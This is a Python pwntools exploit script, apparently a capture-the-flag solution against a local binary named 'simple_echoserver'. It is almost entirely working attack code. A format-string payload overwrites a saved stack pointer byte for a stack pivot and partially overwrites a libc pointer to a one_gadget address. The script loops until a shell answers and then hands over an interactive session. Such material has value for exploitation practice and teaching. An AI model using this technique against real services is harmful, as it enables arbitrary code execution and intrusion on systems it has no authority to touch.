from pwn import *


binpath = './simple_echoserver'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

f = open('/dev/null', 'wb')


gdbscript = '''
gef
# pie breakpoint *0x14C6
# just before fprintf
pie breakpoint *0x1415
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# pid = gdb.attach(io, gdbscript=gdbscript)

while True:
    io = process(binpath, stderr=f)
    offset_io_doalloc_buf = 0x8e300
    offset_one_gadget          = 0xe5863

    index_old_rbp = 7
    index_ptr_to_libc = 26

    # fprintf writes 13 bytes by default ("[USER] name: ")
    payload = b''
    payload += b'%3c%7$hhn'  # overwrite lsbyte of old old rbp to 0x10 for stack pivot
    # specify the offset between addr one gadget and <_IO_doallocbuf+0> on stack, as width field
    written = 16
    write = offset_one_gadget - offset_io_doalloc_buf
    remainder = write - written
    payload += b'%%%dc' % remainder
    # use lower 4 bytes of <_IO_doallocbuf+0> as field width
    payload += b'%*30$c'
    # partial overwrite <_IO_doallocbuf+0> to one gadget
    payload += b'%26$n'

    print(b'payload: ' + payload)
    # %3c%7$hhn%357715c%*30$c%26$n'
    # %3c%7$hhn%357715c%*30$c%26$n

    io.sendlineafter(b'Your name: ', payload)

    # adjust value on stack that it will point to <_IO_doallocbuf+0> on stack
    # the number of digits sent here, will affect lsb of a value on stack
    io.sendlineafter(b'Your phone: ', '0' * 0x18)
    io.sendlineafter(b"Now enjoy yourself!\n", "~.")

    try:
        io.sendline(b"echo success")
        r = io.recvuntil(b"success", timeout=1)
        if not r:
            print("")
            raise EOFError
    except EOFError:
        print("fail")
        continue

    io.interactive()
    break

f.close()
